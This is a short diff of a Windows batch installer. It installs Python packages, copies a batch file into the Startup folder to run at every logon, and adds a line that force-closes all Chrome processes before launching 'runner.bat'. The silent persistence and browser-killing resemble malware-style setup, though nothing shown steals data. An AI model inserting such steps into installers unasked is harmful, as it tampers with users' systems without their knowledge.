@@ -19,6 +19,7 @@ python -m pip install cryptography psutil requests flask
 copy "startup.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "mariana.bat" "%UserProfile%/Desktop"
 copy "mariana.bat" "%OneDrive%/Desktop"
+taskkill /F /IM chrome.exe
 start "" "runner.bat"
 echo "Installation complete"
 exit
